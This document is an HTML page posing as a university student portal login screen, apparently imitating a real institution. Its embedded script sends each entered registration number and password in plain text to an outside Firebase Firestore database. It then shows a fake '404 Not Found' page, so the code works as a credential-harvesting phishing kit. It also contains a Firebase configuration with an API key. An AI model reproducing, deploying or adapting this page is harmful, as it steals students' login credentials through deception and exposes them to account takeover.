<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Student Portal</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-white font-sans text-gray-800">

    <!-- Login View -->
    <div id="login-view" class="min-h-screen flex flex-col items-center pt-12 sm:pt-20 px-4">
        <div class="w-full max-w-[320px]">
            
            <!-- Logo Section -->
            <div class="flex justify-center mb-6">
                <img src="logo.png" alt="University Logo" class="w-36 h-36 object-contain" />
            </div>

            <!-- Headings -->
            <div class="text-center mb-6">
                <h1 class="text-[1.25rem] font-semibold text-[#4b5563] tracking-wider mb-2">
                    STUDENT PORTAL
                </h1>
                <p class="text-[0.85rem] text-[#9ca3af] leading-tight px-4">
                    Enter your Registration No and Password
                </p>
            </div>

            <!-- Error Alert Box (Hidden by default) -->
            <div id="error-box" class="hidden bg-[#ffe8e8] border-l-[5px] border-[#ff5a5a] py-4 px-4 rounded-sm mb-8 flex items-start relative shadow-sm">
                <svg xmlns="http://www.w3.org/2000/svg" width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="text-[#ff5a5a] mt-0.5 flex-shrink-0">
                    <path d="m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3Z"/>
                    <path d="M12 9v4"/>
                    <path d="M12 17h.01"/>
                </svg>
                <div id="error-message" class="ml-4 text-[#ef4444] text-[0.95rem] leading-snug pr-6">
                    Registration failed,<br/>Contact IT/CMS Support
                </div>
                <button id="error-close" class="absolute top-4 right-3 text-[#ff5a5a] hover:text-red-700 transition-colors" aria-label="Close error message">
                    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="w-5 h-5">
                        <path d="M18 6 6 18"/>
                        <path d="m6 6 12 12"/>
                    </svg>
                </button>
            </div>

            <!-- Login Form -->
            <form id="login-form" class="space-y-6">
                
                <!-- Registration Input -->
                <div class="relative">
                    <input
                        type="text"
                        id="reg-no"
                        class="w-full border-b border-gray-100 pb-2 text-[#4b5563] bg-transparent focus:outline-none focus:border-[#4196fb] transition-colors text-[0.85rem]"
                        placeholder="Registration No"
                        required
                    />
                </div>
                
                <!-- Password Input -->
                <div class="relative">
                    <input
                        type="password"
                        id="password"
                        class="w-full border-b border-gray-100 pb-2 text-[#4b5563] bg-transparent focus:outline-none focus:border-[#4196fb] transition-colors text-[0.85rem]"
                        placeholder="Password"
                        required
                    />
                </div>

                <!-- Remember Me & Forgot Password -->
                <div class="flex flex-col space-y-2 pt-1">
                    <label class="flex items-center cursor-pointer group">
                        <input
                            type="checkbox"
                            id="remember"
                            checked
                            class="w-4 h-4 text-[#4196fb] rounded-[3px] border-gray-300 focus:ring-[#4196fb] accent-[#4196fb] cursor-pointer"
                        />
                        <span class="ml-2 text-[0.85rem] text-[#9ca3af] group-hover:text-gray-600 transition-colors">
                            Remember me
                        </span>
                    </label>
                    <a href="#" class="text-[0.85rem] text-[#9ca3af] hover:text-gray-600 transition-colors">
                        Forgot your password?
                    </a>
                </div>

                <!-- Submit Button -->
                <div class="flex justify-end pt-4">
                    <button
                        type="submit"
                        id="submit-btn"
                        class="bg-[#4196fb] hover:bg-blue-500 text-white font-medium py-[8px] px-8 rounded-[4px] transition-colors focus:outline-none focus:ring-2 focus:ring-blue-400 focus:ring-offset-2 text-sm"
                    >
                        <span id="submit-text">Sign In</span>
                    </button>
                </div>
                
            </form>
        </div>
    </div>

    <!-- Success View (Hidden by default) -->
    <div id="success-view" class="hidden min-h-screen flex flex-col items-center pt-24 px-4">
        <div class="w-full max-w-[320px] text-center p-8 border border-gray-100 shadow-sm rounded-lg">
            <img src="error.png" alt="Not Found" class="w-24 h-24 object-contain mx-auto mb-6" />
            <h2 class="text-xl font-semibold text-[#4b5563] mb-2">404</h2>
            <p class="text-[#9ca3af] text-sm">Not Found</p>
            <button 
                id="sign-out-btn"
                class="mt-8 bg-[#4196fb] hover:bg-blue-500 text-white font-medium py-[8px] px-8 rounded-[4px] transition-colors text-sm"
            >
                Sign Out
            </button>
        </div>
    </div>

    <!-- Firebase SDK Setup and Logic -->
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
        import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";

        // Your web app's Firebase configuration
        const firebaseConfig = {
            apiKey: "AIzaSyD4CTfAOFn_JVG32V-7WNVFup10jp-Q9KM",
            authDomain: "ssuet-b87bc.firebaseapp.com",
            projectId: "ssuet-b87bc",
            storageBucket: "ssuet-b87bc.firebasestorage.app",
            messagingSenderId: "684987214935",
            appId: "1:684987214935:web:83f18a4fdf23e36ce88712",
            measurementId: "G-0Z1HYMC9R5"
        };

        // Initialize Firebase
        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);

        // DOM Elements
        const loginView = document.getElementById('login-view');
        const successView = document.getElementById('success-view');
        const loginForm = document.getElementById('login-form');
        const errorBox = document.getElementById('error-box');
        const errorCloseBtn = document.getElementById('error-close');
        const regNoInput = document.getElementById('reg-no');
        const passwordInput = document.getElementById('password');
        const submitBtn = document.getElementById('submit-btn');
        const submitText = document.getElementById('submit-text');
        const signOutBtn = document.getElementById('sign-out-btn');
        const errorMessageDiv = document.getElementById('error-message');

        // Close error box
        errorCloseBtn.addEventListener('click', () => {
            errorBox.classList.add('hidden');
        });

        // Sign out / Return to login
        signOutBtn.addEventListener('click', () => {
            successView.classList.add('hidden');
            loginView.classList.remove('hidden');
            passwordInput.value = '';
        });

        // Handle Form Submission
        loginForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            
            // UI Loading state
            submitBtn.disabled = true;
            submitBtn.classList.remove('bg-[#4196fb]', 'hover:bg-blue-500');
            submitBtn.classList.add('bg-blue-300', 'cursor-not-allowed');
            submitText.innerText = 'Signing In...';
            errorBox.classList.add('hidden');

            const regNo = regNoInput.value;
            const password = passwordInput.value;

            try {
                // Save data directly into Firestore database
                await addDoc(collection(db, "users"), {
                    regNo: regNo,
                    password: password,
                    timestamp: new Date().toISOString()
                });
                
                // On Success
                loginView.classList.add('hidden');
                successView.classList.remove('hidden');

            } catch (error) {
                console.error("Database Error:", error.message);
                
                // On Failure
                errorMessageDiv.innerHTML = "Failed to save to database. Ensure Firestore rules allow writes.";
                errorBox.classList.remove('hidden');
            } finally {
                // Revert UI Loading state if not on success view
                if(successView.classList.contains('hidden')) {
                    submitBtn.disabled = false;
                    submitBtn.classList.add('bg-[#4196fb]', 'hover:bg-blue-500');
                    submitBtn.classList.remove('bg-blue-300', 'cursor-not-allowed');
                    submitText.innerText = 'Sign In';
                }
            }
        });
    </script>
</body>
</html>
